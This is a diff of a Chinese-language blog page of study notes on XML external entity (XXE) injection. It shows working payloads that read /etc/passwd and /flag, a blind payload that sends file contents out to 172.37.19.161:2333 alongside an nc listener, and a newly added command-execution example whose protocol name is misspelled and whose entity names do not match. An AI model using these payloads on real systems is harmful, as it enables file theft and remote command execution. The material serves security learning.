@@ -19,7 +19,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/07/02/4rREZKu9dOz7JNv.png">
 <meta property="og:image" content="https://i.loli.net/2020/07/02/tBRa6jSh34fo9iZ.png">
 <meta property="og:image" content="https://i.loli.net/2020/07/02/n1PUFQfeqpm4SEk.png">
-<meta property="og:updated_time" content="2020-11-29T06:53:29.234Z">
+<meta property="og:updated_time" content="2021-01-11T08:33:19.003Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XML学习">
 <meta name="twitter:description" content="XXE学习记录XXE也就是XML外部实体注入，这主要是DTD文件导致的。 DTD简介​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中： &amp;lt;!DOCTYPE 根元素名 [el">
@@ -213,7 +213,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建文档对象</span></span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);/指定解析器 </span><br><span class="line">    $creds = simplexml_import_dom($dom);<span class="comment">//将DOM对象转换成XML对象</span></span><br><span class="line">    <span class="keyword">echo</span> $creds;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们这里主要探讨Data协议</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA="&gt;</span></span><br><span class="line"><span class="meta"> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [  </span></span><br><span class="line"><span class="meta">    &lt;!ENTITY xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9DOi9waHBTdHVkeS9QSFBUdXRvcmlhbC9XV1cvZmxhZy5waHA="&gt;</span></span><br><span class="line"><span class="meta">     ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p> <img src="https://i.loli.net/2020/07/02/XtAH16oLrYkhCTb.png" alt></p>
 <p>经过data协议只能获取一些加密的值,并不能直接达到读取文件的效果，但是data协议的加密可以绕过许多关键字过滤，我的初步想法是将data协议读出来的数据拼凑出一个新的实体。</p>
@@ -233,8 +233,8 @@
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="无回显XXE"><a href="#无回显XXE" class="headerlink" title="无回显XXE"></a>无回显XXE</h2><p>关于dtd的引用技巧在上文已经介绍的很清楚了，之前说道SYSTEM/PUBLIC关键字实现原理是XML解析器对后面的url发起一次下载请求，我们可以首先使用<code>nc -lvv port</code>来监听端口，收到请求后就会成功的把文件信息带出，关键payload如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:port?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="无回显XXE"><a href="#无回显XXE" class="headerlink" title="无回显XXE"></a>无回显XXE</h2><p>关于dtd的引用技巧在上文已经介绍的很清楚了，之前说道SYSTEM/PUBLIC关键字实现原理是XML解析器对后面的url发起一次请求，我们可以首先使用<code>nc -lvv port</code>来监听端口，收到请求后就会成功的把文件信息带出，关键payload如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://172.37.19.161:2333?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
 <p>当然，XXE注入技巧还有许多，本文就先分析到这里，之后再来补充。</p>
 <h2 id="本地DTD文件"><a href="#本地DTD文件" class="headerlink" title="本地DTD文件"></a>本地DTD文件</h2><p>在靶机不通外网的情况下，可以应用本地DTD文件</p>
@@ -243,6 +243,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="基于报错的XXE"><a href="#基于报错的XXE" class="headerlink" title="基于报错的XXE"></a>基于报错的XXE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>如果PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么可以使用except://命令,这样的格式来执行命令</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "except://id"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://xz.aliyun.com/t/3357#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-22</a> </p>
 <p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a> </p>
@@ -360,8 +363,8 @@
     </a>
   
   
-    <a href="/2019/10/02/PDO学习/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">pdo学习</div>
+    <a href="/2020/06/30/JavaWeb专题/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">TomCat</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -388,7 +391,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE学习记录"><span class="toc-number">1.</span> <span class="toc-text">XXE学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD简介"><span class="toc-number">1.1.</span> <span class="toc-text">DTD简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有回显的XXE"><span class="toc-number">1.2.</span> <span class="toc-text">有回显的XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显XXE"><span class="toc-number">1.3.</span> <span class="toc-text">无回显XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地DTD文件"><span class="toc-number">1.4.</span> <span class="toc-text">本地DTD文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于报错的XXE"><span class="toc-number">1.5.</span> <span class="toc-text">基于报错的XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">1.6.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE学习记录"><span class="toc-number">1.</span> <span class="toc-text">XXE学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD简介"><span class="toc-number">1.1.</span> <span class="toc-text">DTD简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有回显的XXE"><span class="toc-number">1.2.</span> <span class="toc-text">有回显的XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显XXE"><span class="toc-number">1.3.</span> <span class="toc-text">无回显XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地DTD文件"><span class="toc-number">1.4.</span> <span class="toc-text">本地DTD文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于报错的XXE"><span class="toc-number">1.5.</span> <span class="toc-text">基于报错的XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-number">1.6.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">1.7.</span> <span class="toc-text">参考文献</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -417,7 +420,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 Ycj
+    		&copy; 2021 Ycj
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
